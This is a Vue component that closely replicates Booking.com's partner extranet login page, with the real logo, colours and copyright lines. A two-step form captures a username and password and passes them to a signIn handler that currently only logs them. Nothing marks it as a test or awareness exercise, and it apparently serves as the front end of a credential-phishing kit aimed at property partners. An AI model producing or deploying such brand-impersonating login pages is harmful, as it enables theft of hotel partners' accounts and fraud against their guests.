<template>
  <div class="min-h-screen bg-white">
    <!-- Header -->
    <header class="bg-[#003580] text-white">
      <div class="flex items-center justify-between px-6 py-2">
       <a href="https://admin.booking.com/" rel="noopener noreferrer" aria-label="Sign in | Booking.com"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 180 30" width="100" height="16" class="icon-logo"><path fill="#fff" d="M70.6 2.74a2.74 2.74 0 1 1 5.48.02 2.74 2.74 0 0 1-5.48-.02zm45.9 21.03a2.753 2.753 0 0 0 2.548-1.69 2.755 2.755 0 0 0-.59-3.001 2.748 2.748 0 0 0-4.234.412 2.755 2.755 0 0 0 .338 3.47c.513.515 1.21.806 1.938.809zM25.7 6.73a8.55 8.55 0 1 0 8.64 8.55 8.292 8.292 0 0 0-8.64-8.55zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zm39.6-4.12a3.661 3.661 0 0 0-.65-.92l-.15-.16.16-.15c.252-.272.482-.563.69-.87l4.39-6.55h-5.33l-3.31 5.13a1.299 1.299 0 0 1-1.13.41h-.75V2.91c0-1.93-1.21-2.2-2.51-2.2h-2.23v22.87h4.73v-6.86h.44c.54 0 .91.06 1.08.36l2.62 4.89a2.62 2.62 0 0 0 2.82 1.57h3.63l-2.71-4.47-1.79-3.36zm22.97-9.02a6.42 6.42 0 0 0-4.8 2l-.29.29-.1-.4a2.17 2.17 0 0 0-2.38-1.5h-2.13v16.49h4.72v-7.6a6.11 6.11 0 0 1 .29-2 3.86 3.86 0 0 1 3.81-2.89c1.46 0 2 .77 2 2.78v7.19a2.19 2.19 0 0 0 2.51 2.51h2.22V13.07c.03-4.17-2-6.38-5.85-6.38zm-14.88.37h-2.22v16.52h4.7v-14a2.2 2.2 0 0 0-2.48-2.52zm-29.23-.33a8.55 8.55 0 1 0 8.64 8.55 8.292 8.292 0 0 0-8.64-8.55zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zm100.73-13.1a8.549 8.549 0 0 0-1.545 16.942 8.548 8.548 0 0 0 10.185-8.392 8.277 8.277 0 0 0-.585-3.336 8.291 8.291 0 0 0-8.055-5.214zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zM109.74 7.02a2.002 2.002 0 0 0-1.93 1l-.12.25-.22-.19a6.39 6.39 0 0 0-4.33-1.44c-4.39 0-7.36 3.31-7.36 8.23s3.07 8.35 7.45 8.35a5.81 5.81 0 0 0 3.62-1.06l.36-.28v.46c0 2.21-1.43 3.43-4 3.43a9.463 9.463 0 0 1-3.16-.59 1.39 1.39 0 0 0-2 1l-.91 2.28.33.17a12.82 12.82 0 0 0 5.76 1.34c4 0 8.67-2.06 8.67-7.83V7.02h-2.16zm-5.68 12.09c-2.56 0-3.48-2.25-3.48-4.35 0-.93.23-4 3.23-4 1.49 0 3.49.42 3.49 4.1 0 3.52-1.76 4.25-3.24 4.25zm-90.97-7.26l-.69-.38.6-.5a5.54 5.54 0 0 0 1.88-4.31c0-3.6-2.79-5.92-7.09-5.92H2.31A2.4 2.4 0 0 0 0 3.1v20.4h7.88c4.79 0 7.89-2.61 7.89-6.66a5.57 5.57 0 0 0-2.68-4.99zM4.37 6.08c0-1.06.45-1.56 1.43-1.62h2a2.47 2.47 0 0 1 2.68 2.69 2.55 2.55 0 0 1-2.66 2.82H4.37V6.08zM8.2 19.64H4.37v-4.58c0-1 .39-1.49 1.22-1.61H8.2a3.1 3.1 0 0 1 0 6.19zm166.33-12.9a6.478 6.478 0 0 0-5.05 2.45l-.34.44-.27-.49a4.67 4.67 0 0 0-4.45-2.4 6 6 0 0 0-4.33 1.95l-.44.48-.17-.63a2.11 2.11 0 0 0-2.3-1.42h-2v16.45h4.46v-7.26a8.452 8.452 0 0 1 .24-1.92c.43-1.76 1.61-3.65 3.59-3.46 1.22.12 1.82 1.06 1.82 2.89v9.75h4.52v-7.26a6.626 6.626 0 0 1 .25-2c.36-1.67 1.59-3.39 3.5-3.39 1.38 0 1.89.78 1.89 2.89v7.36c0 1.66.74 2.4 2.4 2.4H180v-10.5c0-4.2-1.85-6.33-5.47-6.33zm-40.84 11.12a6.882 6.882 0 0 1-4.48 2.11 4.403 4.403 0 0 1-4.367-2.798 4.394 4.394 0 0 1-.293-1.812 4.35 4.35 0 0 1 2.665-4.382A4.334 4.334 0 0 1 129 10.65c.84 0 1.8.3 1.95.81v.09a1.659 1.659 0 0 0 1.6 1.21H135v-2.15c0-2.84-3.61-3.87-6-3.87-5.19 0-9 3.63-9 8.61 0 4.98 3.73 8.62 8.86 8.62a9.637 9.637 0 0 0 7-3.12L134 17.58l-.31.28z"></path></svg></a>
        <div class="flex items-center gap-2">
          <button class="p-2 hover:bg-[#00224f] rounded-sm transition-colors">
            <div class="flex items-center gap-1">
              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Ccircle cx='12' cy='12' r='11' fill='white'/%3E%3Ctext x='12' y='16' text-anchor='middle' font-size='16'%3E🇺🇸%3C/text%3E%3C/svg%3E" alt="US Flag" class="w-6 h-6" />
            </div>
          </button>
          <button class="p-2 hover:bg-[#00224f] rounded-sm transition-colors">
            <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
          </button>
        </div>
      </div>
    </header>

    <!-- Main Content -->
    <main class="flex flex-col items-center  min-h-[calc(100vh-64px)] mt-12 px-4 pt-4">
      <div class="w-full max-w-[400px]">
        
        <!-- Step 1: Username -->
        <div v-if="step === 1">
          <h1 class=" text-xl font-bold text-gray-900 mb-8">
            Sign in to manage your property
          </h1>
          
          <form @submit.prevent="nextStep">
            <div class="mb-4">
              <label for="username" class="block text-sm font-medium text-gray-900 pb-1">
                Username
              </label>
              <input
                id="username"
                v-model="username"
                type="text"
                placeholder='Also known as "Login name" and "Login ID"'
                class="w-full px-2 py-1 border border-gray-400 rounded-sm text-base focus:border-[#003580] focus:outline-none focus:ring-2 focus:ring-[#003580] focus:ring-opacity-20"
                required
              />
            </div>
            
            <button
              type="submit"
              class="w-full bg-[#0071c2] hover:bg-[#00519e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
            >
              Next
            </button>
          </form>
          
          <div class="mt-6 text-center">
            <a href="#" class="text-[#0071c2] hover:underline text-sm font-normal">
              Having trouble signing in?
            </a>
          </div>
          
          <div class="mt-12">
            <p class="text-sm text-gray-700 text-center mb-6">
              Questions about your property or the Extranet? Check out 
              <a href="#" class="text-[#0071c2] hover:underline">Partner Help</a> or<br/>
              ask another partner in the 
              <a href="#" class="text-[#0071c2] hover:underline">Partner Community</a>.
            </p>
            
            <button
              class="w-full bg-white hover:bg-gray-50 text-[#0071c2] font-medium py-3 px-4 rounded border border-[#0071c2] transition-colors duration-150"
            >
              Create your partner account
            </button>
          </div>

          <div class="mt-12 text-center">
            <p class="text-xs text-gray-600 mb-1">
              By signing in or creating an account, you agree with our 
              <a href="#" class="text-[#0071c2] hover:underline">Terms &<br/>Conditions</a> and 
              <a href="#" class="text-[#0071c2] hover:underline">Privacy Statement</a>
            </p>
            <p class="text-xs text-gray-600 mt-6">
              All rights reserved.
            </p>
            <p class="text-xs text-gray-600">
              Copyright (2006-2025) – Booking.com™
            </p>
          </div>
        </div>

        <!-- Step 2: Password -->
        <div v-else-if="step === 2">
          <h1 class="text-2xl font-bold text-gray-900 mb-4 text-center">
            Enter your password
          </h1>
          
          <p class="text-base text-gray-700 mb-6 text-center">
            Enter your Booking.com password for <span class="font-semibold">{{ username }}</span>.
          </p>
          
          <form @submit.prevent="signIn">
            <div class="mb-4">
              <label for="password" class="block text-sm font-medium text-gray-900 mb-2">
                Password
              </label>
              <div class="relative">
                <input
                  id="password"
                  v-model="password"
                  :type="showPassword ? 'text' : 'password'"
                  placeholder="Enter your password"
                  class="w-full px-3 py-2.5 pr-20 border border-gray-400 rounded-sm text-base focus:border-[#003580] focus:outline-none focus:ring-2 focus:ring-[#003580] focus:ring-opacity-20"
                  required
                />
                <div class="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center">
                  <button
                    type="button"
                    @click="showPassword = !showPassword"
                    class="p-1.5 text-gray-600 hover:text-gray-800"
                  >
                    <svg v-if="!showPassword" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                    <svg v-else class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                  </button>
                  <button
                    type="button"
                    class="p-1.5 text-gray-600 hover:text-gray-800"
                    title="Password info"
                  >
                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                    </svg>
                  </button>
                </div>
              </div>
            </div>
            
            <button
              type="submit"
              class="w-full bg-[#0071c2] hover:bg-[#00519e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
            >
              Sign in
            </button>
          </form>
          
          <div class="mt-6 text-center">
            <a href="#" class="text-[#0071c2] hover:underline text-sm font-normal">
              Forgot your password?
            </a>
          </div>

          <div class="mt-12 text-center">
            <p class="text-xs text-gray-600 mb-1">
              By signing in or creating an account, you agree with our 
              <a href="#" class="text-[#0071c2] hover:underline">Terms &<br/>Conditions</a> and 
              <a href="#" class="text-[#0071c2] hover:underline">Privacy Statement</a>
            </p>
            <p class="text-xs text-gray-600 mt-6">
              All rights reserved.
            </p>
            <p class="text-xs text-gray-600">
              Copyright (2006-2025) – Booking.com™
            </p>
          </div>
        </div>

      </div>
    </main>
  </div>
</template>

<script>
export default {
  name: 'BookingSignIn',
  data() {
    return {
      step: 1,
      username: '', 
      password: '',
      showPassword: false
    }
  },
  methods: {
    nextStep() {
      if (this.username) {
        this.step = 2
      }
    },
    signIn() {
     
      console.log('Signing in with:', {
        username: this.username,
        password: this.password
      })

      
    },
    goBack() {
      this.step = 1
      this.password = ''
    }
  }
}
</script>

<style scoped>

input::placeholder {
  color: #6b7280;
  font-size: 14px;
}


input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus {
  -webkit-box-shadow: 0 0 0px 1000px white inset;
  transition: background-color 5000s ease-in-out 0s;
}


button {
  min-height: 48px;
}
</style>


